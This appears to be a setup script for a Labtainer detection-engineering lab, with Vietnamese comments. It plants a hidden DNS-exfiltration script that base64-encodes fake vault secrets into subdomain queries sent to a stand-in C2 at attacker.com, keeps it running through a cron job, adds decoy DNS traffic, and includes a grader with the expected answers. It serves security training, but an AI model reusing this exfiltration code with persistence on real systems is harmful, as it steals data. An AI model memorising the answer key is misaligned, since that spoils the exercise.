# Gieo malware DNS-exfil (nguy trang) + luong DNS LANH TINH lam nhieu + log /var/log/dns-queries.log
# (Wazuh giam sat) cho detection engineering. Cong/EXID ca nhan hoa qua RAND_REPLACE (token EXID).
PW="$1"
S(){ echo "$PW" | sudo -S "$@"; }

# ===== 1) analyst cho DEFENDER SSH sang xu ly su co =====
S useradd -m -s /bin/bash analyst 2>/dev/null
S bash -c 'echo "analyst:analyst" | chpasswd'
S usermod -aG sudo analyst 2>/dev/null

# ===== 2) File du lieu nhay cam (quyen 644 bi lo - SV phai khoa lai) =====
S mkdir -p /opt/company
# FLAG dung token SECRETVAL (KHAC EXID cua domain) -> SV phai GIAI MA base64 moi lay duoc,
# khong suy ra tu domain exfil-<EXID> hien o log.
S bash -c 'cat > /opt/company/secret_vault.txt <<EOF
FLAG_SECRET=PTIT_VAULT_SECRETVAL
CUSTOMER_CARD_1=4532-9981-2234-0012
CUSTOMER_CARD_2=5412-7765-8890-1123
API_PRIVATE_KEY=sk_live_998877665544332211_ptit
EOF'
S chmod 644 /opt/company/secret_vault.txt

# ===== 3) Log DNS (Wazuh giam sat) - world-writable de ca 2 luong ghi vao =====
S touch /var/log/dns-queries.log
S chmod 666 /var/log/dns-queries.log

# ===== 4) MA DOC: .dns_exfil.sh - doc vault, base64, tuon qua subdomain DNS toi C2 (.5), DON DAP =====
S bash -c 'cat > /usr/local/bin/.dns_exfil.sh <<'"'"'EOF'"'"'
#!/bin/bash
DNS_C2="172.20.0.5"
DOMAIN="exfil-EXID.attacker.com"
LOG="/var/log/dns-queries.log"
while true; do
  if [ -r /opt/company/secret_vault.txt ]; then
    while IFS= read -r line; do
      [ -z "$line" ] && continue
      B64=$(echo -n "$line" | base64 | tr -d "=\n")
      QUERY="${B64}.${DOMAIN}"
      echo "$(date "+%b %d %H:%M:%S") target dns-client[$$]: query[A] ${QUERY} from 172.20.0.10 to ${DNS_C2}" >> "$LOG"
      dig @"${DNS_C2}" "${QUERY}" +short +time=1 +tries=1 >/dev/null 2>&1 || true
      sleep 1
    done < /opt/company/secret_vault.txt
  fi
  sleep 6
done
EOF'
S chmod +x /usr/local/bin/.dns_exfil.sh

# ===== 5) PERSISTENCE ma doc: cron dns-sync tu khoi dong lai neu chua xoa =====
S bash -c 'cat > /etc/cron.d/dns-sync <<EOF
* * * * * ubuntu pgrep -f .dns_exfil.sh >/dev/null || nohup /bin/bash /usr/local/bin/.dns_exfil.sh >/dev/null 2>&1 &
EOF'
S chmod 644 /etc/cron.d/dns-sync

# ===== 6) LUONG LANH TINH (NHIEU NEN) - DNS he thong hop le, subdomain NGAN, toi DNS that .1 =====
#   KHONG phai ma doc -> ung pho KHONG duoc dong toi. Dung de do rule co bao gia (FP) hay khong.
S bash -c 'cat > /usr/local/bin/dns-legit.sh <<EOF
#!/bin/bash
LOG="/var/log/dns-queries.log"
DOMS=(update.ubuntu.com api.company-x.vn packages.wazuh.com pool.ntp.org security.debian.org)
while true; do
  d=\${DOMS[\$RANDOM % \${#DOMS[@]}]}
  echo "\$(date "+%b %d %H:%M:%S") target dns-client[\$\$]: query[A] \${d} from 172.20.0.10 to 172.20.0.1" >> "\$LOG"
  sleep \$((9 + RANDOM % 8))
done
EOF'
S chmod +x /usr/local/bin/dns-legit.sh
S bash -c 'cat > /etc/cron.d/dns-legit <<EOF
* * * * * ubuntu pgrep -f dns-legit.sh >/dev/null || nohup /bin/bash /usr/local/bin/dns-legit.sh >/dev/null 2>&1 &
EOF'
S chmod 644 /etc/cron.d/dns-legit

# ===== 7) Phieu dieu tra ~/findings.txt (5 IOC - SV tu tim + GIAI MA base64) =====
cat > /tmp/findings.txt <<'FND'
# BAO CAO DIEU TRA DNS EXFIL - dien gia tri TU TIM/GIAI MA (KEY=value):
# DNS_C2_IP    : IP may chu DNS ma nhan du lieu ro ri
# EXFIL_DOMAIN : ten mien goc lam duong ham (dang exfil-<so>.attacker.com)
# LEAKED_SECRET: gia tri FLAG_SECRET sau khi base64 -d chuoi subdomain doc trong log
# MAL_SCRIPT   : duong dan tuyet doi script ma doc exfil
# PERSIST_CRON : duong dan tep cron duy tri ma doc
DNS_C2_IP=
EXFIL_DOMAIN=
LEAKED_SECRET=
MAL_SCRIPT=
PERSIST_CRON=
FND
S cp /tmp/findings.txt /home/analyst/findings.txt
S chown analyst:analyst /home/analyst/findings.txt
S chmod 644 /home/analyst/findings.txt

# ===== 8) Wazuh agent: giam sat /var/log/dns-queries.log (cho SV viet rule) =====
S bash -c 'grep -q "dns-queries.log" /var/ossec/etc/ossec.conf 2>/dev/null || cat >> /var/ossec/etc/ossec.conf <<EOF
<ossec_config>
  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/dns-queries.log</location>
  </localfile>
</ossec_config>
EOF'
S systemctl restart wazuh-agent 2>/dev/null || S service wazuh-agent restart 2>/dev/null || true

# ===== 9) Khoi dong cron + ca 2 luong DNS =====
S systemctl restart cron 2>/dev/null || S service cron restart 2>/dev/null || true
setsid /bin/bash /usr/local/bin/.dns_exfil.sh >/dev/null 2>&1 < /dev/null &
setsid /bin/bash /usr/local/bin/dns-legit.sh >/dev/null 2>&1 < /dev/null &

exit 0
__EOF_DNS_6p3k__
cat > "$LAB/target/_bin/prestop" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# Chup trang thai target luc checkwork/stoplab -> prestop.stdout (cham diem).
# Chi in co/OK, KHONG lo IOC that (nhat la SECRET) -> tranh SV doc prestop.stdout chep dap an.
trap "echo Timed out; exit" SIGTERM
echo "PRESTOP_MARKER"

F=/home/analyst/findings.txt
LOG=/var/log/dns-queries.log

# --- UNG PHO 1: chan IP DNS C2 (.5) bang iptables (chan theo LUAT, khong dem ket noi) ---
sudo -n iptables -S 2>/dev/null | grep -qE '172\.20\.0\.5(/32)?.*-j (DROP|REJECT)' && echo "CONTAINED"

# --- SLA: ket noi lanh tinh toi SIEM (.20) con song (khong chan bua lam dut giam sat) ---
SL=$(ss -tn 2>/dev/null | grep -c '172.20.0.20:')
[ "${SL:-0}" -ge 1 ] && echo "SLA_OK"

# --- UNG PHO 2: diet tien trinh exfil + go persistence (script + cron) ---
pgrep -f '\.dns_exfil\.sh' >/dev/null 2>&1 || echo "EXFIL_PROC_STOPPED"
{ [ ! -f /usr/local/bin/.dns_exfil.sh ] && [ ! -f /etc/cron.d/dns-sync ]; } && echo "EXFIL_PERSISTENCE_REMOVED"

# --- UNG PHO 3: khoa quyen file nhay cam ---
if sudo -n test -f /opt/company/secret_vault.txt 2>/dev/null; then
  P=$(sudo -n stat -c '%a' /opt/company/secret_vault.txt 2>/dev/null)
  case "$P" in 600|400|000|640|440) echo "VAULT_SECURED";; esac
else
  echo "VAULT_SECURED"   # da ma hoa/xoa ban ro
fi

# --- DIEU TRA: doi chieu 5 IOC trong findings.txt voi SU THAT ---
# Ground-truth: domain lay tu LOG (ton tai ca sau ung pho); SECRET lay tu vault qua sudo (vault chmod van doc duoc).
GTDOM=$(grep -oE 'exfil-[0-9]+\.attacker\.com' "$LOG" 2>/dev/null | head -1)
GTSEC=$(sudo -n grep -oE 'PTIT_VAULT_[0-9]+' /opt/company/secret_vault.txt 2>/dev/null | head -1)
val(){ sed -n "s/^$1=//p" "$F" 2>/dev/null | head -1 | tr -d ' \r'; }
[ "$(val DNS_C2_IP)" = "172.20.0.5" ] && echo "REP_C2_OK"
[ -n "$GTDOM" ] && [ "$(val EXFIL_DOMAIN)" = "$GTDOM" ] && echo "REP_DOMAIN_OK"
[ -n "$GTSEC" ] && [ "$(val LEAKED_SECRET)" = "$GTSEC" ] && echo "REP_SECRET_OK"
[ "$(val MAL_SCRIPT)" = "/usr/local/bin/.dns_exfil.sh" ] && echo "REP_SCRIPT_OK"
[ "$(val PERSIST_CRON)" = "/etc/cron.d/dns-sync" ] && echo "REP_CRON_OK"

echo "=== findings (bao cao cua analyst) ==="
cat "$F" 2>/dev/null
exit 0
__EOF_DNS_6p3k__
cat > "$LAB/target/_bin/treataslocal" <<'__EOF_DNS_6p3k__'
iptables
chmod
chown
pkill
kill
rm
__EOF_DNS_6p3k__
echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/attacker/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh 2>/dev/null || true
find "$LAB" -type f -exec sed -i 's/\r$//' {} +
echo ">> XONG. Tiep theo:  cd \$LABTAINER_DIR/scripts/labtainer-student && rebuild soc-dns-exfil"
